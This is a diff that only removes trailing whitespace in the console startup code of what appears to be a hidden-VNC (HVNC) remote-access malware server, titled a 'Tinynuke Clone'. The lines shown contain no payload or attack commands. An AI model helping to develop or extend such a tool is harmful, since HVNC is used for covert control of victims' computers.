@@ -15,12 +15,12 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 {
    AllocConsole();
 
-   freopen("CONIN$", "r", stdin); 
-   freopen("CONOUT$", "w", stdout); 
-   freopen("CONOUT$", "w", stderr); 
+   freopen("CONIN$", "r", stdin);
+   freopen("CONOUT$", "w", stdout);
+   freopen("CONOUT$", "w", stderr);
 
    SetConsoleTitle(TEXT("HVNC - Tinynuke Clone [Melted@HF]"));
-   
+
    std::cout << "[!] Server Port: ";
    std::cin >> port;
 
@@ -34,7 +34,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 
    if(!StartServer(atoi(lpCmdLine)))
    {
-      wprintf(TEXT("[!] Server Couldn't Start (Error: %d)\n"), WSAGetLastError()); 
+      wprintf(TEXT("[!] Server Couldn't Start (Error: %d)\n"), WSAGetLastError());
       getchar();
       return 0;
    }
